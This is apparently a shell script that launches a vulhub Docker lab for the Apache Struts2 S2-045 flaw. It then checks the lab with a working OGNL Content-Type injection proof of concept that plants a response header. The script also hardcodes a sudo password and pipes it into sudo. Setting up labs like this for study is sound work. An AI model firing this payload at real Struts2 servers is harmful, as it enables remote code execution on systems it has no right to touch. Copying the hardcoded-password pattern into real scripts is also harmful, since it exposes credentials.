#!/bin/bash
# 单独快速启 Struts2 S2-045（镜像 vulhub/struts2:2.3.30 已在本地 519MB，无需下载）
export KALI_PASS="kail"
echo "$KALI_PASS" | sudo -S -v -p "" 2>/dev/null
SUDO="sudo"

cd ~/vulhub/struts2/s2-045
$SUDO docker-compose down 2>/dev/null

# 固定 8082 端口（避免跟 8080/8081 冲突）
echo "[*] 重写 docker-compose.yml（端口 8082）"
$SUDO tee docker-compose.yml >/dev/null <<'EOF'
version: '2'
services:
  struts2:
    image: vulhub/struts2:2.3.30
    container_name: vulhub-struts2-s2045
    ports:
      - "8082:8080"
EOF
cat docker-compose.yml

echo ""
echo "[*] up -d ..."
$SUDO docker-compose up -d 2>&1 | tail -10
echo ""
echo "[*] 等 Tomcat + Struts2 部署（Java 项目启动慢，耐心等 2 分钟）"
for i in $(seq 1 15); do
  sleep 12
  C=$(curl -s -o /dev/null -w "%{http_code}" --max-time 12 http://127.0.0.1:8082/ 2>&1 || echo 000)
  # S2-045 POC：改 Content-Type 为 OGNL，往响应头写 X-S2-Exec=PWN-S2045
  HEADER_OUT=$(curl -sS -D /tmp/s2hdr.txt -X POST --max-time 15 http://127.0.0.1:8082/ \
    -H 'Content-Type: %{#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("X-S2-PWND","PWN-S2045")}.multipart/form-data' \
    -o /tmp/s2body.txt 2>&1; grep -i "X-S2-PWND" /tmp/s2hdr.txt 2>/dev/null || echo "")
  echo "  等 $(( i*12 ))s:  / HTTP $C    HeaderInject=[$(echo "$HEADER_OUT" | tr -d '\r' | head -1)]"
  if [ -n "$HEADER_OUT" ]; then
    echo ""
    echo "✅✅✅ Struts2 S2-045 OGNL RCE 靶场 POC 验证成功！响应头被注入：$(echo $HEADER_OUT)"
    break
  fi
done

echo ""
$SUDO docker ps --format "{{.Names}}  {{.Image}}  {{.Ports}}" | grep -E "struts|NAMES"
echo ""
echo "宿主机访问：  http://192.168.108.128:8082/"
echo "Burp POC：    POST / HTTP/1.1  → 把 Content-Type 改成 OGNL 表达式即可"
echo "DONE."
